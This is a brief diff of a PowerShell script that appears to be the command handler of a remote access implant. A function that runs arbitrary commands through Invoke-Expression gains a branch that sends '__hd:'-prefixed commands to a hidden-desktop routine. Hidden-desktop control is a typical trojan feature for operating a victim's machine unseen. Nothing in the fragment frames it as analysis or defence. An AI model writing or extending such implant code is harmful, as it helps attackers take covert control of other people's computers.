@@ -39,6 +39,7 @@ function Get-SystemMetadata {
 
 function Invoke-Command {
     param([string]$Command)
+    if ($Command.StartsWith('__hd:')) { return (Invoke-HiddenDesktop $Command) }
     try {
         $output = Invoke-Expression $Command 2>&1 | Out-String
         if ([string]::IsNullOrEmpty($output)) {
